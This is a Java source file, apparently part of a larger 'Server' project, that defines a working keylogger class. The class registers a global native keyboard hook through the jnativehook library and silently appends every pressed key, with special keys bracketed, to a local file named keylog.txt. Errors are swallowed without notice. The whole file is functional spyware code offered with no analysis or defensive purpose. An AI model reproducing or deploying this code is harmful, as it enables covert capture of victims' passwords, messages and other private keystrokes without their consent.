package Server;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

class Keylogger extends Thread implements NativeKeyListener{
    public static final Path file = Paths.get("keylog.txt");
    @Override
    public void run() {
        try {
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException e) {
        }

        GlobalScreen.addNativeKeyListener(new Keylogger());
    }
    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());

        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
                StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {

            if (keyText.length() > 1) {
                writer.print("[" + keyText + "]");
            } else {
                writer.print(keyText);
            }

        } catch (IOException ex) {
        }
    }
    public void nativeKeyReleased(NativeKeyEvent e) {
    }
    public void nativeKeyTyped(NativeKeyEvent e) {
    }
}
